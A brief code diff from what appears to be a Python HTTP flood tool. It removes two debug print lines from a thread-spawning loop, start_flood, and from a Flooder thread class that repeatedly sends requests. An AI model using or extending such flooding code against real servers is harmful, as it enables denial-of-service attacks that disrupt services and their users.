@@ -90,7 +90,6 @@ def start_flood():
     while True:
         if threading.active_count() < thread_limit:
             Flooder().start()
-            print(threading.active_count())
 
 
 class Flooder(threading.Thread):
@@ -119,7 +118,6 @@ class Flooder(threading.Thread):
                     connection.getresponse().read()
 
         except:
-            print('except')
             sys.exit()
             pass
 
